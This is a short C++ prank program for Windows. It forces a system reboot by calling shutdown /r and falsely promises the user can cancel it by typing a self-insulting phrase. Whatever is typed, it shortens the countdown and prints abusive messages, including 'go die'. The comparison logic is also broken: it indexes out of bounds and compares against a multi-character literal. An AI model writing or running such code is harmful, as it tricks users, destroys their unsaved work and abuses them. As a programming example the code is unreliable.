#include <iostream>
#include <windows.h>
using namespace std;
int main()
{
    char a[50] = {};
    system("shutdown /r /t 60");
    cout << "输入'我是傻逼'即可解除:" << endl;
    cin >> a;
    if (a[50] == '我是傻逼')
    {
        cout << "傻逼,真信了!!" << endl;
        system("shutdown /r /t 10");
    }
    else
    {
        cout << "傻逼,去死吧!!" << endl;
        system("shutdown /r /t 5");
    }
    return 0;
}
